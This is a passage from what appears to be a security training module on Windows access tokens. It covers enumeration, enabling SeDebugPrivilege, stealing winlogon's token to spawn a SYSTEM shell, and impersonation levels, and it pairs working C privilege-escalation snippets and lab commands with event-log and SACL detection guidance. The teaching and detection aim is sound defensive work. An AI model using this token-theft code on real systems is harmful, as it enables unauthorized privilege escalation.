    "AuthenticationId":  {
                             "LowPart":  313930,
                             "HighPart":  0
                         },
    "TokenType":  1,
    "ExpirationTime":  9223372036854775807,
    "Id":  {
               "LowPart":  4105639,
               "HighPart":  0
           },
    "ModifiedId":  {
                       "LowPart":  4105626,
                       "HighPart":  0
                   },
    "Owner":  {
                  "Authority":  {
                                    "Value":  "0 0 0 0 0 5"
                                },
                  "SubAuthorities":  [
                                         32,
                                         544
                                     ],
                  "Name":  "BUILTIN\\Administrators",
                  "Parent":  {
                                 "Authority":  "Nt",
                                 "SubAuthorities":  "32",
                                 "Name":  "BUILTIN\\BUILTIN",
                                 "Parent":  "S-1-5"
                             }
              },
...SNIP...

```

This verbose output contains a lot of information such as privileges, groups, token type, etc., and can be saved in a json file as well.

```powershell
PS C:\> Get-NtToken -ProcessId 2000 | ConvertTo-Json > C:\Tools\Temp\2000.json

```

There are other scripts available that can perform token enumeration, such as [Get-Token.ps1](https://gist.github.com/vector-sec/a049bf12da619d9af8f9c7dbd28d3b56).

To detect token enumeration, we can combine process monitoring with API monitoring to track calls such as `OpenProcessToken()` and `GetTokenInformation()` made by non-standard processes (e.g., web servers). Additionally, PowerShell Script Block Logging should be enabled to monitor commands and scripts involving token-related enumeration.

## Token Enumeration Source Code

Here's the source code for the token enumeration sample that we used in this section.

```c
#include <windows.h>
#include <stdio.h>
#include <sddl.h>

void PrintPrivileges(PTOKEN_PRIVILEGES pPriv) {
    printf("      [+] Token Privileges:\n");
    for (DWORD i = 0; i < pPriv->PrivilegeCount; i++) {
        LUID_AND_ATTRIBUTES la = pPriv->Privileges[i];
        char name[256];
        DWORD nameLen = sizeof(name) / sizeof(name[0]);
        if (LookupPrivilegeNameA(NULL, &la.Luid, name, &nameLen)) {
            printf("          -> Privilege: %s (Attributes: 0x%x)\n", name, la.Attributes);
        }
        else {
            printf("          -> Privilege: Unknown (LUID: 0x%08x%08x, Attributes: 0x%x)\n",
                la.Luid.HighPart, la.Luid.LowPart, la.Attributes);
        }
    }
}

int main() {
    HANDLE hToken;
    DWORD returnLength = 0;
    PTOKEN_USER pTokenUser = NULL;
    PTOKEN_PRIVILEGES pTokenPrivileges = NULL;
    TOKEN_TYPE tokenType;

    // Open the access token associated with the current process
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        printf("OpenProcessToken failed. Error: %u\n", GetLastError());
        return 1;
    }
    printf("\n[+] Opened process token using OpenProcessToken(GetCurrentProcess())\n");

    // Get TokenUser information
    GetTokenInformation(hToken, TokenUser, NULL, 0, &returnLength);
    pTokenUser = (PTOKEN_USER)LocalAlloc(LPTR, returnLength);
    if (!GetTokenInformation(hToken, TokenUser, pTokenUser, returnLength, &returnLength)) {
        printf("GetTokenInformation (TokenUser) failed. Error: %u\n", GetLastError());
        LocalFree(pTokenUser);
        CloseHandle(hToken);
        return 1;
    }

    printf("\n[+] Retrieved \"TokenUser\" information using GetTokenInformation()\n");

    // Convert the SID to a string
    LPSTR sidString = NULL;
    ConvertSidToStringSidA(pTokenUser->User.Sid, &sidString);

    // Lookup the account name for the SID
    char name[256], domain[256];
    DWORD nameSize = sizeof(name) / sizeof(name[0]);
    DWORD domainSize = sizeof(domain) / sizeof(domain[0]);
    SID_NAME_USE sidType;
    LookupAccountSidA(NULL, pTokenUser->User.Sid, name, &nameSize, domain, &domainSize, &sidType);

    // Print the user and SID
    printf("      [+] Token User Information:\n");
    printf("           -> User : %s\\%s\n", domain, name);
    printf("           -> SID  : %s\n", sidString);

    // Get TokenPrivileges information
    GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &returnLength);
    pTokenPrivileges = (PTOKEN_PRIVILEGES)LocalAlloc(LPTR, returnLength);
    if (!GetTokenInformation(hToken, TokenPrivileges, pTokenPrivileges, returnLength, &returnLength)) {
        printf("GetTokenInformation (TokenPrivileges) failed. Error: %u\n", GetLastError());
        LocalFree(pTokenPrivileges);
        LocalFree(sidString);
        LocalFree(pTokenUser);
        CloseHandle(hToken);
        return 1;
    }
    printf("\n[+] Retrieved \"TokenPrivileges\" information using GetTokenInformation()\n");

    PrintPrivileges(pTokenPrivileges);

    // Get TokenType information
    returnLength = sizeof(tokenType);
    if (!GetTokenInformation(hToken, TokenType, &tokenType, returnLength, &returnLength)) {
        printf("GetTokenInformation (TokenType) failed. Error: %u\n", GetLastError());
        LocalFree(pTokenPrivileges);
        LocalFree(sidString);
        LocalFree(pTokenUser);
        CloseHandle(hToken);
        return 1;
    }

    printf("\n[+] Retrieved \"TokenType\" information using GetTokenInformation()\n");

    printf("      [+] Token Type Information:\n");
    printf("          -> Token Type: %s\n", (tokenType == TokenPrimary) ? "Primary" : "Impersonation");

    // Clean up
    LocalFree(pTokenPrivileges);
    LocalFree(sidString);
    LocalFree(pTokenUser);
    CloseHandle(hToken);

    return 0;
}

```

* * *

Note: Please wait for 2-3 minutes after the target spawns before connecting to ensure the Active Directory domain environment and services are properly configured.

* * *


# Token Manipulation

* * *

As per [MITRE technique T1134](https://attack.mitre.org/techniques/T1134/), adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token. The most common token-abuse techniques are as follows:

- `Token Manipulation`: Access tokens can be manipulated to obtain additional privileges or modify existing ones. For example, adversaries may add one special privilege or change the integrity level of a token to bypass security checks.
- `Token Theft`: Adversaries can steal interesting access tokens from legitimate users or processes. This can be done using the built-in Windows API functions such as [OpenProcess()](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess), [OpenProcessToken()](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken), [ImpersonateLoggedOnUser()](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-impersonateloggedonuser), [DuplicateTokenEx()](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex), and [CreateProcessWithTokenW()](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw).
- `Token Impersonation`: By using a stolen access token, adversaries can impersonate a user or process which allows them to perform actions on behalf of the impersonated user.
- `Parent PID Spoofing`: Adversaries can use an access token to create a new process by spoofing the Parent Process ID (PID) of a process. This is mostly done in order to evade detections based on the parent-child process anomalies.

Let's discuss these techniques further to understand how they work and the related artifacts generated.

## Manipulating Token Privileges

Token privilege manipulation involves adding, removing, or adjusting the privileges assigned to a token. The Windows API function [AdjustTokenPrivileges()](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges) can be used for this purpose. Manipulating token privileges can result in privilege escalation or performing actions that a user or process is not normally allowed to perform.

Let's understand this with the help of a program that enables the SeDebugPrivilege ( `SE_DEBUG_NAME`) privilege for the current process on Windows using the Windows API functions. Enabling the [SE\_DEBUG\_NAME](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants) privilege allows a process to debug other processes on the system. It first opens a handle to the access token of the current process using `OpenProcessToken()`, then retrieves the LUID for the `SE_DEBUG_NAME` privilege using `LookupPrivilegeValueA()`. Next, it sets up a `TOKEN_PRIVILEGES` structure to enable the privilege and uses `AdjustTokenPrivileges()` to apply the changes to the token.

Let's understand each of the functions to see how the privileges are enabled in this token. The first function which was used is `OpenProcessToken()`.

### OpenProcessToken()

This function is used to open a handle to the access token of the current process. The access token contains information about the privileges held by the process.

The following is the syntax for this function:

```c
// Open a handle to the access token for the calling process
result = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
if (!result) {
  fprintf(stderr, "OpenProcessToken failed (%d)\n", GetLastError());
  return 1;
}

```

The first parameter is `ProcessHandle`, which points to a handle to the process whose access token is to be opened. In this scenario, this function is called with the [GetCurrentProcess()](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocess) handle to obtain the access token for the current process. The second parameter `DesiredAccess`, has the value of `TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY`, indicating that the access token should be opened with the rights necessary to adjust privileges and query information. And the third parameter is a HANDLE variable that will receive the access token handle if the function succeeds.

If the function succeeds, it returns a non-zero value. If it fails, it returns zero.

### LookupPrivilegeValueA()

The next function is `LookupPrivilegeValueA()`. This function retrieves the locally unique identifier (LUID) for a specified privilege name ( `SE_DEBUG_NAME` in this case). The LUID is required to enable or disable the privilege.

The following is the syntax for this function:

```c
// Get the LUID for the SE_DEBUG_NAME privilege
result = LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &tkp.Privileges[0].Luid);
if (!result) {
  fprintf(stderr, "LookupPrivilegeValueA failed (%d)\n", GetLastError());
  CloseHandle(hToken);
  return 1;
}

tkp.PrivilegeCount = 1;  // One privilege to set
tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

```

In this case, this function is used to retrieve the locally unique identifier (LUID) for the privilege name "SeDebugPrivilege". The first parameter, `lpSystemName`, is NULL, indicating that the function should use the local system. The second parameter, `lpName`, contains the name of the privilege to look up, in this case, "SeDebugPrivilege". The third parameter, `lpLuid`, is a pointer to a LUID structure that receives the LUID corresponding to the privilege name.

If the function succeeds, it returns a non-zero value. If it fails, it returns zero.

### AdjustTokenPrivileges()

This function enables or disables privileges in an access token. It requires a [TOKEN\_PRIVILEGES](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-token_privileges) structure that specifies the privileges to be modified and their attributes (in this case, enabling `SE_DEBUG_NAME`).

The following is the syntax for this function:

```c
// Enable the SE_DEBUG_NAME privilege in the access token
result = AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, 0);
if (!result) {
  fprintf(stderr, "AdjustTokenPrivileges failed (%d)\n", GetLastError());
  CloseHandle(hToken);
  return 1;
}

```

The first parameter, `TokenHandle`, contains the handle to the access token on which to adjust privileges. The second parameter, `DisableAllPrivileges`, is set as FALSE, indicating that only the privileges specified in the `NewState` parameter should be modified. The third parameter is `NewState` which is a pointer to a `TOKEN_PRIVILEGES` structure that specifies the privileges to be modified and their attributes.

If the function succeeds, it returns a non-zero value. If it fails, it returns zero.

Let's navigate to the bottom of this section and click on "Click here to spawn the target system!". Then, let's RDP into the Target IP using the provided credentials. The mentioned tools (inclduing WinDbg) are installed on the target system and the shortcut files are created on the desktop. The vast majority of the actions/commands covered from this point up to end of this section can be replicated inside the target, offering a more comprehensive grasp of the topics presented.

Within the target (VM), we can locate the tools at the following paths:

- **Token Priv**: `C:\Tools\token_priv.exe`
- **Tokenvator**: `C:\Tools\Tokenvator.exe`

In an elevated command prompt, we'll run the custom program ( `token_priv.exe`) which enables a privilege:

```cmd-session
C:\> C:\Tools\token_priv.exe
SE DEBUG privilege enabled

```

This will enable the `SeDebugPrivilege` privilege, and we should be able to view a security event log with ID 4703.

We can also use another popular token manipulation tool known as [Tokenvator](https://github.com/0xbadjuju/Tokenvator).

This can be executed directly, and we can check the help menu.

![token](https://academy.hackthebox.com/storage/modules/256/tokenv1.png)

It contains a command to enable privileges. Let's try to enable a privilege.

![token](https://academy.hackthebox.com/storage/modules/256/tokenv2.png)

## Detection opportunities

Whenever the token privileges are enabled or disabled for a specific account's token, an event is logged with `event ID 4703`, named "A token right was adjusted". By monitoring this event, we can track changes to privileges assigned to user accounts. If an unauthorized or unexpected privilege is added by a suspicious process, it could indicate an attempt at token manipulation.

This event log is present in Event Viewer under Security events.

![eid4703](https://academy.hackthebox.com/storage/modules/256/eid4703_.png)

To ensure we see the events generated when the token privileges are modified, we need to enable the auditing of token right adjustment. To enable the auditing of token right adjustments, we need to configure the audit policy settings on the target system by following these steps:

1. `Open Local Group Policy Editor`: Press Win + R, type gpedit.msc, and press Enter.

2. `Navigate to Audit Policy Settings`:
   - Go to Computer Configuration > Windows Settings > Security Settings > Advanced Audit Policy Configuration > Detailed Tracking.
   - Double-click on "Audit Token Right Adjusted" to open its properties.
3. `Enable Audit Policy`:
   - Check the box for Success and/or Failure, depending on whether we want to audit successful or failed attempts.
   - Click OK to save the changes.
4. `Apply the Audit Policy`:
   - Run `gpupdate /force` in the Command Prompt to apply the policy immediately.
   - After enabling this policy, the system will start logging Event ID `4703` whenever token privileges are adjusted.

![audit secpol](https://academy.hackthebox.com/storage/modules/256/auditsecpol.png)

* * *

Note: Please wait for 2-3 minutes after the target spawns before connecting to ensure the Active Directory domain environment and services are properly configured.

* * *


# Token Theft (T1134.001)

In the case of token theft, we see a pattern of Windows API functions. After obtaining the handle to the target process using the Windows API function `OpenProcess()`, another function, `OpenProcessToken()`, is used to obtain a handle to the access token of the target process that we want to impersonate. Then, the `DuplicateTokenEx()` function is called on this token handle to create a new access token that duplicates an existing token. This function can create either a primary token or an impersonation token. Finally, the duplicated access token is passed to the `CreateProcessWithTokenW()` function to start a new process using the duplicated token, effectively running the process as the specified user, or this token can be used in a thread in the current process.

![Token Theft scenario](https://academy.hackthebox.com/storage/modules/256/token-theft_.png)

> **Note**: `SeImpersonatePrivilege` is required in order to impersonate other users. This is a powerful privilege assigned to the administrator account by default.

By default, the "Impersonate a client after authentication" [user right](https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege) is assigned to members of the device's local Administrators group and the device's local Service account. This right is also granted to the following components:

- Services started by the Service Control Manager
- Component Object Model (COM) servers started by the COM infrastructure and configured to run under a specific account

Granting the "Impersonate a client after authentication" user right to a user allows programs running on behalf of that user to impersonate a client.

![Impersonate](https://academy.hackthebox.com/storage/modules/256/impersonate.png)

The screenshot below shows the Administrator user having the `SeImpersonatePrivilege` privilege enabled.

![SeImpersonatePrivilege](https://academy.hackthebox.com/storage/modules/256/seimpersonatepriv_.png)

## Token-Duplication Method

In case of Token Theft, an adversary aims to steal a privileged token (e.g., SYSTEM or admin user) from a legitimate process. The attacker can use APIs like [OpenProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess), [OpenProcessToken](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken), and [DuplicateTokenEx](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex) to:

- Gain access to a target process that holds the desired token.
- Open the token associated with the target process.
- Duplicate the token for reuse in impersonation or privilege escalation.

The code snippet below demonstrates the process of duplicating a token:

```c
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
if (hProcess == NULL) {
  fprintf(stderr, "Failed to open process (%d)\n", GetLastError());
  return 1;
}

HANDLE hToken;
if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
  fprintf(stderr, "OpenProcessToken failed (%d)\n", GetLastError());
  CloseHandle(hProcess);
  return 1;
}

HANDLE hDupToken;
if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityIdentification, TokenPrimary, &hDupToken)) {
  fprintf(stderr, "DuplicateTokenEx failed (%d)\n", GetLastError());
  CloseHandle(hToken);
  CloseHandle(hProcess);
  return 1;
}

```

In the above code, the steps involved are as follows:

- `OpenProcess`: Gain a handle to a target process with privileges using its PID.
- `OpenProcessToken`: Extract the token associated with the target process.
- `DuplicateTokenEx`: Create a copy of the primary token with the desired permissions.

The syntax for `DuplicateTokenEx()` function is as follows:

```cmd-session
BOOL DuplicateTokenEx(
   [in]           HANDLE                       hExistingToken,
   [in]           DWORD                        dwDesiredAccess,
   [in, optional] LPSECURITY_ATTRIBUTES        lpTokenAttributes,
   [in]           SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
   [in]           TOKEN_TYPE                   TokenType,
   [out]          PHANDLE                      phNewToken
);

```

Using this function, a new access token is created that duplicates an existing token. Typically, this token is acquired through the `OpenProcessToken()` function. Let's take a look at the parameters of this function.

- `hExistingToken`: Handle to the existing token to duplicate.
- `dwDesiredAccess`: Specifies the desired access rights for the new token. Examples of access rights are `TOKEN_DUPLICATE`, `TOKEN_QUERY`, `TOKEN_ADJUST_DEFAULT`, `TOKEN_ADJUST_SESSIONID`, and `TOKEN_ASSIGN_PRIMARY`.
- `lpTokenAttributes`: Security attributes to apply to the new token (NULL indicates default security attributes).
- `ImpersonationLevel`: Specifies the impersonation level of the new token (1 corresponds to SecurityIdentification). The screenshot below shows different values for the impersonation level.

![sec_imp_level](https://academy.hackthebox.com/storage/modules/256/sec_imp_level.png)

- `TokenType`: Specifies the type of the new token (primary or impersonation).
- `phNewToken`: Pointer to a handle variable that receives the new token handle.

Now that we have a duplicate token, let's see how a new process can be created using this duplicate token.

## Create Process with Token (T1134.002)

MITRE has documented this technique under the technique ID [T1134.002](https://attack.mitre.org/techniques/T1134/002/). In an attempt to elevate privileges and circumvent access controls, adversaries may spawn a new process using an existing token. This allows them to assume the security context of another user. Techniques like [CreateProcessWithTokenW](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw) and [RunAs](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)) facilitate the creation of processes with a token belonging to a different user.

![](https://academy.hackthebox.com/storage/modules/256/createprocesswithtokenw_.png)

To create processes with a non-current user's token, attackers may need the target user's credentials, specific privileges to impersonate that user, or access to the token itself. They could duplicate the token through methods like Token Impersonation/Theft or create it using Make and Impersonate Token before utilizing it to spawn a process. Below is an example of calling the [CreateProcessWithTokenW()](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw) function to create a new command prompt ( `cmd.exe`) process using the specified access token, allowing the new process to run with the privileges associated with that token.

The `CreateProcessWithTokenW` function creates a new process and its primary thread using the specified token. This function allows a process to run under the security context of a different user. The syntax for this function is as follows:

```cmd-session
   BOOL CreateProcessWithTokenW(
      [in]                HANDLE                hToken,
      [in]                DWORD                 dwLogonFlags,
      [in, optional]      LPCWSTR               lpApplicationName,
      [in, out, optional] LPWSTR                lpCommandLine,
      [in]                DWORD                 dwCreationFlags,
      [in, optional]      LPVOID                lpEnvironment,
      [in, optional]      LPCWSTR               lpCurrentDirectory,
      [in]                LPSTARTUPINFOW        lpStartupInfo,
      [out]               LPPROCESS_INFORMATION lpProcessInformation
   );

```

The parameters in this function are explained as follows:

- `hToken`: Token that represents the user. This token must have been created with `TOKEN_QUERY`, `TOKEN_DUPLICATE`, and `TOKEN_ASSIGN_PRIMARY` access rights.
- `dwLogonFlags`: Specifies how the environment variables, if any, are inherited from the calling process.
- `lpApplicationName`: Path to the application to be executed.
- `lpCommandLine`: Command line for the application.
- `dwCreationFlags`: Flags that control the priority class and the creation of the process.
- `lpEnvironment`: Environment block for the new process.
- `lpCurrentDirectory`: Current directory for the new process.
- `lpStartupInfo`: Pointer to a `STARTUPINFO` structure.
- `lpProcessInformation`: Pointer to a `PROCESS_INFORMATION` structure that receives identification information about the new process.

These techniques are often observed being used in combination by adversaries, i.e., first duplicating a token and then using it to launch a new process, as shown in the code snippet below:

```c
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
if (hProcess == NULL) {
  fprintf(stderr, "Failed to open process (%d)\n", GetLastError());
  return 1;
}

HANDLE hToken;
if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
  fprintf(stderr, "OpenProcessToken failed (%d)\n", GetLastError());
  CloseHandle(hProcess);
  return 1;
}

HANDLE hDupToken;
if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityIdentification, TokenPrimary, &hDupToken)) {
  fprintf(stderr, "DuplicateTokenEx failed (%d)\n", GetLastError());
  CloseHandle(hToken);
  CloseHandle(hProcess);
  return 1;
}

STARTUPINFOW si; // Use STARTUPINFOW instead of STARTUPINFO
PROCESS_INFORMATION pi;

ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&pi, sizeof(pi));

if (!CreateProcessWithTokenW(hDupToken, LOGON_NETCREDENTIALS_ONLY, NULL, L"C:\\Windows\\system32\\cmd.exe", 0, NULL, NULL, &si, &pi)) {
  fprintf(stderr, "CreateProcessWithTokenW failed (%d)\n", GetLastError());
  CloseHandle(hDupToken);
  CloseHandle(hToken);
  CloseHandle(hProcess);
  return 1;
} else {
  printf("Spawned process with SYSTEM token\n");
}

```

## Token theft scenario: Elevating to NT AUTHORITY\\SYSTEM

Attackers often seek ways to elevate their privileges from a Local Administrator to the SYSTEM account, as the SYSTEM account has the highest level of access on a Windows system. Attackers use techniques such as token manipulation to duplicate a token with SYSTEM-level privileges.

To demonstrate this technique, we have a custom program that takes the PID of the target process to steal its token with higher privileges and spawns a new process using the [CreateProcessWithTokenW()](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw) function.

Let's navigate to the bottom of this section and click on "Click here to spawn the target system!". Then, let's RDP into the Target IP using the provided credentials. The mentioned tools (inclduing WinDbg) are installed on the target system and the shortcut files are created on the desktop. The vast majority of the actions/commands covered from this point up to end of this section can be replicated inside the target, offering a more comprehensive grasp of the topics presented.

Within the target (VM), we can locate the tools and samples at the following paths:

- **Process Hacker**: `C:\Tools\ProcessHacker\ProcessHacker.exe`
- **Token Theft**: `C:\Tools\token_theft.exe`

* * *

Run the custom program in an elevated command prompt:

```cmd-session
C:\> C:\Tools\token_theft.exe 588
Spawned process with SYSTEM token

```

In this example, `588` is the PID of `winlogon.exe`, which is running as `NT AUTHORITY\SYSTEM`.

![Token Theft Scenario](https://academy.hackthebox.com/storage/modules/256/token_theft_.png)

In the screenshot above, the token-stealing program is utilizing the `winlogon.exe` process to elevate the permissions to `NT AUTHORITY\SYSTEM`. If we open the Token Viewer, we can see the difference in the privileges. A lot more privileges are added for the created process.

![Token Theft Scenario](https://academy.hackthebox.com/storage/modules/256/crtokenprivs.png)

**PROCESS\_QUERY\_INFORMATION**

When `OpenProcess()` is called with the `dwDesiredAccess` [access right](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights) `PROCESS_QUERY_INFORMATION`, the resulting handle allows the caller to query certain information about the process, such as its exit code, process ID, and other basic information.

```C
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (hProcess == NULL) {
        fprintf(stderr, "Failed to open process (%d)\n", GetLastError());
        return 1;
    }

```

Post-attack forensics shows a list of interesting event logs that are generated:

- `Security Event ID 4688` \- (A new process has been created):

  - This is created when the parent process token\_theft.exe is executed.
- `Security Event ID 4703` \- (A token right was adjusted):

  - This is generated when `SeDebugPrivilege` privilege is enabled.
- `Security Event ID 4656` \- (A handle to an object was requested):

  - This event is created when `winlogon.exe` is accessed.
- `Security Event ID 4690` \- (An attempt was made to duplicate a handle to an object):

  - This event is created when the token handle was duplicated.
- `Security Event ID 4688` \- (A new process has been created):

  - This event is created after the elevated child process `cmd.exe` is spawned. This event log also provides information that the process is running with elevated token, i.e., with fully enabled privileges.

Security Event ID `4656` is generated when `winlogon.exe` is accessed. This event log provides information such as the process object that was targeted, the process that initiated the request, and the specific access right(s) sought. The access mask value of `0x1400` is significant; it indicates that when a handle possesses the `PROCESS_QUERY_INFORMATION` access right, it also automatically gains the `PROCESS_QUERY_LIMITED_INFORMATION` access right. That's why in accesses, there are two values: one is Query process information and the other is Undefined Access (no effect).

![Event ID 4656](https://academy.hackthebox.com/storage/modules/256/eid4656_.png)

**PROCESS\_ALL\_ACCESS**

When a process calls the `OpenProcess()` function with `dwDesiredAccess` [access right](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights) `PROCESS_ALL_ACCESS`, it grants full access to the process, allowing the caller to query and modify almost all aspects of the process, including memory, threads, and security information.

```C
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        fprintf(stderr, "Failed to open process (%d)\n", GetLastError());
        return 1;
    }

```

In this case, we can see a lot of accesses in the Access Request Information in the event logs.

![Event ID 4656 - All access](https://academy.hackthebox.com/storage/modules/256/eid4656all_.png)

## Enable auditing and SACL for detection

The event logs that are required to be enabled are under the event ID [4656](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4656). To enable the auditing on the target system, we need to configure the below audit policy settings:

1. **Open Local Group Policy Editor**:
   - Press `Win + R`, type `gpedit.msc`, and press Enter.
2. **Navigate to Audit Policy Settings**:
   - Go to Computer Configuration > Windows Settings > Security Settings > Advanced Audit Policy Configuration > Object Access.
   - Double-click on "Audit Kernel Object" to open its properties.
3. **Enable Audit Policy**:
   - Check the box for Success and/or Failure, depending on whether we want to audit successful or failed attempts.
   - Click OK to save the changes.
4. **Apply the Audit Policy**:
   - Run `gpupdate /force` in the Command Prompt to apply the policy immediately.

After enabling this policy, the system will start logging Event ID `4656` whenever process access is requested. Use the Event Viewer ( `eventvwr.msc`) to view the auditing events such as "A handle to an object was requested".

![Auditing](https://academy.hackthebox.com/storage/modules/256/auditaccess.png)

To detect malicious access token manipulation, System Access Control Lists (SACLs) can be set up to audit process objects.

![SACL Info](https://academy.hackthebox.com/storage/modules/256/saclinfo_.png)

## SACL

A System Access Control List (SACL) allows administrators to log attempts to access a secured object. Let's understand what a simple ACL is. ACL stands for an Access Control List which is a list of security protections that apply to an object, such as a file, process, or event, defined by its security descriptor. Each entry in an ACL is called an Access Control Entry (ACE).

The [security descriptor](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptors) for a [securable object](https://learn.microsoft.com/en-us/windows/win32/secauthz/securable-objects) can contain two types of ACLs: a DACL and an SACL, which are defined as follows:

- `Discretionary ACL (DACL)`: This type of ACL controls access to an object by users or groups. It specifies which users or groups are allowed or denied access and the type of access they have (e.g., read, write, execute).

- `System ACL (SACL)`: This type of ACL controls auditing for an object. It specifies which actions on the object should be audited, such as successful or failed access attempts, and by which users or groups.


By setting up SACLs to audit specific actions on critical processes, such as process access attempts for doing the access token manipulation attempts, we can detect and respond to malicious activity more effectively.

The commands below enable auditing for the "Object Access" category with both success and failure events enabled. It sets a specific security descriptor for the "winlogon.exe" process to include a SACL (System Access Control List) entry that generates security audit events for successful and failed access attempts from the Everyone (WD) group. This can easily be done using the `Set-NtSecurityDescriptor` command from NtObjectManager.

![SACL set](https://academy.hackthebox.com/storage/modules/256/sacl_set.png)

Get the winlogon.exe process:

```powershell
PS C:\> $p = (Get-NtProcess -Name winlogon.exe -Access GenericAll,AccessSystemSecurity)[0]

```

Set the SACL required for detecting the access attempts.

```powershell
PS C:\> Set-NtSecurityDescriptor $p “S:(AU;SAFA;0x1400;;;WD)” Sacl

```

The security descriptor string " `S:(AU;SAFA;0x1400;;;WD)`" represents a SACL (System Access Control List) entry in a security descriptor.

- " `S:`" indicates that this is a SACL entry.
- " `(AU;SAFA;0x1400;;;WD)`" specifies the details of the SACL entry:

  - " `AU`" stands for Audit Access.
  - " `SAFA`" stands for Successful Access and Failed Access.
  - " `0x1400`" represents the access mask, which is a combination of PROCESS\_QUERY\_INFORMATION (0x400) and PROCESS\_QUERY\_LIMITED\_INFORMATION (0x1000). If someone tries with PROCESS\_ALL\_ACCESS, it should also generate events.
  - " `WD`" specifies the identifier (SID) for the Everyone group.

After enabling this and the audit event, we should be able to see events with event ID 4656 for any access attempts on the specified processes (in this case, it is winlogon.exe).

However, one challenge is identifying which processes are potential targets for access token manipulation. For example, SYSTEM processes like `lsass.exe`, `winlogon.exe`, etc., can be targeted for access token impersonation. Regularly monitoring and analyzing audit logs for suspicious activity related to process access and token manipulation can help identify and respond to such threats.

* * *

Note: Please wait for 2-3 minutes after the target spawns before connecting to ensure the Active Directory domain environment and services are properly configured.

* * *


# Token Impersonation

A key feature of Windows access tokens is [impersonation](https://learn.microsoft.com/en-us/windows/win32/com/impersonation). Microsoft has documented impersonation as the ability of a thread to execute in a security context that is different from the context of the process that owns the thread. In some scenarios, such as applications running multiple threads, various issues could arise if different threads modify privileges or token DACLs independently. To address this, Windows supports impersonation, which allows a thread to switch to a different security context. Impersonation tokens are local copies of a token applied to threads, while primary tokens are associated with processes.

Impersonation tokens play a critical role in system services, enabling a process with one identity to temporarily adopt another identity for access verification purposes. For instance, a service may require access to a file owned by another user during a specific operation. By permitting the service to impersonate the calling user, the system grants it access to the file, even if the service lacks direct access.

**Note:** Impersonation tokens are associated with threads, not processes.

Impersonation occurs only within the thread making the impersonation request, while the process retains its primary token. An impersonation token represents an impersonated security context, allowing a thread to access objects under a different security context temporarily. Threads can revert to their primary security context after completing impersonation using APIs such as [RevertToSelf](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-reverttoself) or [RpcRevertToSelfEx](https://learn.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcreverttoselfex).

However, there are some points to note regarding the working of impersonation tokens:

- Certain actions, like process creation, continue to use the primary token, even when a thread is impersonating another security context.
- Cannot impersonate tokens with a higher integrity level than the current context.
- Impersonation requires client consent and may be restricted by the client.

## Impersonation Levels

Security impersonation levels govern the degree to which a server process can act on behalf of a client process. The `SECURITY_IMPERSONATION_LEVEL` enumeration defines four impersonation levels that determine the operations a server can perform in the client's context. We can check this in Windbg as follows.

![Impersonate](https://academy.hackthebox.com/storage/modules/256/imp-levels.png)

The table below explains these levels of impersonation:

| Impersonation level | Description |
| --- | --- |
| `SecurityAnonymous` | The server cannot impersonate or identify the client. |
| `SecurityIdentification` | The server can get the identity and privileges of the client, but cannot impersonate the client. |
| `SecurityImpersonation` | The server can impersonate the client's security context on the local system. |
| `SecurityDelegation` | The server can impersonate the client's security context on remote systems. |

